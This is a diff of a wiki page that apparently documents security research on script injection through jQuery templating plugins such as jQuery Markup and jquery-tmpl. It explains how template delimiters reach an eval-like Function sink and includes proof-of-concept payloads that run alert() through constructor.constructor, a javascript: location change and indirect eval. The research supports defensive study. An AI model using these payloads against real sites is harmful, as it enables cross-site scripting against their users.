@@ -3,7 +3,7 @@
 
 = Introduction =
 
-jQuery might be one of the most well-known JavaScript libraries out there. According to [http://trends.builtwith.com/javascript/jQuery BuiltWith], more than half of the Quantcast Top 1 Million websites use it - and 20% of the entire Internet does so too. 
+jQuery might be one of the most well-known !JavaScript libraries out there. According to [http://trends.builtwith.com/javascript/jQuery BuiltWith], more than half of the Quantcast Top 1 Million websites use it - and 20% of the entire Internet does so too. That's a lot.
 
 While jQuery on its own doesn't support MVC or templating, a bunch of jQuery plugins do. And, to our very surprise, most of them are quite secure! Most of them. let's have a look at those who aren't.
 
@@ -16,7 +16,7 @@ Add your content here.  Format your content with:
 
 == jQuery Markup ==
 
-jQuery Markup is a very interesting project as it allows to define templates inside custom tags - the `<markup>` elements.
+jQuery Markup is a very interesting project as it allows to define templates inside custom tags - the `<markup>` elements. The content of the <markup> elements can be of many different types. jQuery Markup supports a large bunch of templating languages - among them even exotic birds like HAML, 
 
 === HAML ===
 
@@ -53,7 +53,7 @@ Once an attacker has write-access to the content of the template block, one of t
 
 {{{
 <script src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
-<script src="https://raw.github.com/BorisMoore/jquery-tmpl/master/jquery.tmpl.js"></script>
+<script src="https://rawgithub.com/BorisMoore/jquery-tmpl/master/jquery.tmpl.js"></script>
 
 <script type="text/x-jquery-tmpl" id="jqTemplate">
  <ul>${constructor.constructor(/alert(1)/.source)()}</ul>
@@ -123,11 +123,6 @@ window.onload = function(){
 === Injection Attacks ===
 
 {{{
-<script>
-window.alert = function(a){
-	return confirm(a)
-}
-</script>
 <script src="http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.7.1.min.js"></script>
 <script src="https://rawgithub.com/KanbanSolutions/jquery-tmpl/master/jquery.tmpl.js"></script>
 <script type="text/javascript">
@@ -135,16 +130,21 @@ jQuery(function(){
 	$("#x").tmpl([{}])
 });
 </script>
-<div id="x" type="text/x-jquery-tmpl">
+<div id="x">
 	${constructor.constructor('alert(1)')()}
-	{%= (1,eval)('this').alert(2) %}
+	${alert.bind(window)(2)}
+	${location='javascript\x3Aalert%283%29'}
+	{%= (1,eval)('this').alert(4) %}
 </div>
-
 }}}
 
 === Eval via Function ===
 
-The current jQuery Template Plugin features two ways to parse and execute template code. 
+The current jQuery Template Plugin features two ways to parse and execute template code - one for the `${}` syntax and one for the mustache-like syntax. For us this doesn't really matter - what matters is that what ever happens inside the template delimiters is being pumped straight into a Function call - along with a heavily concatenated string containing the "parsed" results. 
+
+Only one thing separated the template delimiters from being a perfect eval sink: the `call()` syntax the developers used to mess a bit with the execution scope. As seen above, we don't really care and execute arbitrary JavaScript as we please.
+
+Note that the template element can be any kind of element - as long as it matches the ID given in the !JavaScript calling the template method. In our example we used a `DIV` - and not a `SCRIPT` with type `text/x-jquery-tmpl`.
 
 {{{
     // Generate a reusable function that will serve to render a template against data
